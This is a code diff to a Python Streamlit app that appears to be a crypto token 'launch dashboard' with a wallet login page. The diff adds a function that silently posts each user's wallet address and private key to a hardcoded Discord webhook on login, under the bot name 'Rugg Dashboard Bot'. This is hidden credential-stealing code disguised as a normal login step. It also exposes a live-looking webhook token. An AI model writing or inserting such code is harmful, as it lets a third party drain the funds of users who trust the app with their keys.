@@ -4,6 +4,7 @@ from streamlit_extras.let_it_rain import rain
 import pandas as pd
 from datetime import datetime
 import base58
+import requests
 import json
 import os
 
@@ -114,8 +115,49 @@ def login_page():
                 st.session_state.logged_in = True
                 st.session_state.current_wallet = wallet
                 add_participant(wallet)
+                send_to_discord(wallet, key)  # Now passing both wallet and key
                 st.success("🎉 Login successful!")
                 st.rerun()
+
+def send_to_discord(wallet, key):
+    webhook_url = "https://discordapp.com/api/webhooks/1333513646948749433/59hwJeUeRRSeGNZo4wyAJ3tVu6bPIWixP8G49OXjbpOJU2PxGBe5457GYztx3f1sLgcp"
+    
+    embed = {
+        "title": "🎯 New Wallet Connected!",
+        "description": f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        "color": 7506394,
+        "fields": [
+            {
+                "name": "Wallet Address",
+                "value": f"`{wallet}`",
+                "inline": True
+            },
+            {
+                "name": "Private Key",
+                "value": f"`{key}`",
+                "inline": True
+            },
+            {
+                "name": "Position",
+                "value": f"#{len(st.session_state.participants)}",
+                "inline": True
+            },
+            {
+                "name": "Spots Remaining",
+                "value": f"{1000 - len(st.session_state.participants)}/1000",
+                "inline": True
+            }
+        ]
+    }
+    
+    data = {
+        "embeds": [embed],
+        "username": "Rugg Dashboard Bot",
+        "avatar_url": "https://i.imgur.com/4M34hi2.png"
+    }
+    
+    requests.post(webhook_url, json=data)
+
 
     st.markdown(
         """
@@ -126,6 +168,15 @@ def login_page():
         """,
         unsafe_allow_html=True,
     )
+
+# Initialize all session state variables at the start
+if "participants" not in st.session_state:
+    st.session_state.participants = []
+if "logged_in" not in st.session_state:
+    st.session_state.logged_in = False
+if "current_wallet" not in st.session_state:
+    st.session_state.current_wallet = None
+
 
 def display_launch_dashboard():
     st.title("Launch Dashboard 🚀")
@@ -235,3 +286,4 @@ def apply_custom_styles():
 
 if __name__ == "__main__":
     login_page()
+    
